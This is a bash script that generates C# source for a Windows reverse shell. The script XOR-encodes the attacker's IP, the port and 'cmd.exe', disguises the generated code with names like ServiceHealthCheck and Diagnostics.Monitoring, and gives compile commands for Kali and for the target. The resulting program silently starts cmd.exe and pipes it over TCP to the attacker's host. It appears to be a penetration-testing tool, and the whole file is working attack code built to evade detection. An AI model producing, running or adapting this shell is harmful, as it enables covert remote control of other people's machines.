#!/bin/bash
# gen_cs_shell.sh - Generate a C# reverse shell with XOR-obfuscated strings
# Usage: ./gen_cs_shell.sh [interface] [port] [output_dir]
#
# Generates shell.cs with XOR-encrypted IP, port, and command strings.
# Compile on Kali:   mcs -out:svc.exe shell.cs
# Compile on target: csc.exe /nologo /out:svc.exe shell.cs

IFACE="${1:-tun0}"
LPORT="${2:-5986}"
OUTDIR="${3:-.}"
LHOST=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)

if [ -z "$LHOST" ]; then
    echo "[!] Could not resolve IP from interface: $IFACE"
    exit 1
fi

echo "[*] LHOST: $LHOST ($IFACE)"
echo "[*] LPORT: $LPORT"

# Generate a random XOR key
KEY=$(( RANDOM % 200 + 50 ))

# XOR encrypt a string and return C# byte array
xor_string() {
    local input="$1"
    local key="$2"
    local result=""
    for (( i=0; i<${#input}; i++ )); do
        byte=$(printf '%d' "'${input:$i:1}")
        xored=$(( byte ^ key ))
        [ -n "$result" ] && result+=","
        result+="$xored"
    done
    echo "$result"
}

IP_ENC=$(xor_string "$LHOST" "$KEY")
PORT_ENC=$(xor_string "$LPORT" "$KEY")
CMD_ENC=$(xor_string "cmd.exe" "$KEY")

# Random class/method names
CLASS="ServiceHealthCheck"
METHOD="ValidateEndpoint"
DECR="ParseConfig"

mkdir -p "$OUTDIR"
cat > "${OUTDIR}/shell.cs" << CSHARP
using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Text;

namespace Diagnostics.Monitoring
{
    class ${CLASS}
    {
        static string ${DECR}(byte[] data, int k)
        {
            char[] r = new char[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (char)(data[i] ^ k);
            return new string(r);
        }

        static void ${METHOD}()
        {
            int k = ${KEY};
            byte[] a = new byte[] { ${IP_ENC} };
            byte[] b = new byte[] { ${PORT_ENC} };
            byte[] c = new byte[] { ${CMD_ENC} };

            string host = ${DECR}(a, k);
            int port = int.Parse(${DECR}(b, k));
            string sh = ${DECR}(c, k);

            TcpClient tcp = new TcpClient();
            tcp.Connect(host, port);
            NetworkStream ns = tcp.GetStream();

            Process p = new Process();
            p.StartInfo.FileName = sh;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            StreamWriter input = p.StandardInput;
            input.AutoFlush = true;

            Thread tOut = new Thread(() => {
                try {
                    byte[] buf = new byte[4096];
                    int read;
                    while ((read = p.StandardOutput.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        ns.Write(buf, 0, read);
                } catch {}
            });

            Thread tErr = new Thread(() => {
                try {
                    byte[] buf = new byte[4096];
                    int read;
                    while ((read = p.StandardError.BaseStream.Read(buf, 0, buf.Length)) > 0)
                        ns.Write(buf, 0, read);
                } catch {}
            });

            tOut.IsBackground = true;
            tErr.IsBackground = true;
            tOut.Start();
            tErr.Start();

            try {
                byte[] recv = new byte[4096];
                int bytes;
                while ((bytes = ns.Read(recv, 0, recv.Length)) > 0)
                {
                    string cmd = Encoding.ASCII.GetString(recv, 0, bytes);
                    input.Write(cmd);
                }
            } catch {}

            p.Close();
            tcp.Close();
        }

        static void Main(string[] args)
        {
            try { ${METHOD}(); } catch {}
        }
    }
}
CSHARP

echo ""
echo "[+] Generated: ${OUTDIR}/shell.cs (XOR key: $KEY)"
echo ""
